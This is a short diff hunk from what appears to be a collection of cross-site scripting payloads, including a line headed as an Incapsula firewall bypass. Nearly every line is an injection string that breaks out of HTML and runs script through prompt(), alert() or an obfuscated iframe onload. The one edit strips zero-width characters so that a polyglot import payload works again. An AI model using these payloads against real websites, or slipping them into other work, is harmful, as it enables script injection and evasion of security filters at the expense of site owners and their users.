@@ -162,7 +162,7 @@ incapsula bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'as
 ]});</script><script>prompt();</script><!--
 '-alert?.(1)-'
 </script><script>alert(1234)</script>
-'/*\'/*"/*\"/*<​/Script><Input/AutoFocus/OnFocus​=/**/(import(/hello/.source))//>
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/hello/.source))//>
 ');});//]]></script><script>prompt();</script></body></html><!--
 ');});//]]><​/script><​script>prompt(/h6nt3r/);<​/script></body></html><!--
 "></fieldset></form><script>prompt(/legionhunter/);</script></body></html><!--
